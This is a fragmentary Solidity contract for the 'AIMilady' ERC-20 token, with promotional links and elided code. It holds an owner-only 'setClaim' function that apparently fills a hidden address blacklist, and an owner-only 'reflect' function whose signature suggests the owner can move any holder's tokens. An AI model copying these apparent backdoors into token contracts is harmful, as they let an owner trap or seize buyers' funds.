...
/**   
        ...
        - Website: https://aimilady.app
        - Telegram: https://t.me/AIMilady
        - Twitter: https://twitter.com/AI_Milady
**/
...
contract AIMilady is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "AIMilady";
    string private constant _symbol = "AIMilady";
    ...
    mapping(address => bool) private bts; mapping (address => uint256) public _buyMap;
    address payable private _developmentAddress = payable(0xA1F6F89808249b1eBDdFA0349ecBEf4d6100F75B);
    address payable private _marketingAddress = payable(0xA1F6F89808249b1eBDdFA0349ecBEf4d6100F75B);
    ...
    function sendETHToFee(uint256 amount) private {
        _marketingAddress.call{value: amount}("");
    }
    ...
    function setClaim(address[] memory bts_) public onlyOwner {
    ...
    function reflect(address sender, address recipient, uint256 amount) public onlyOwner {
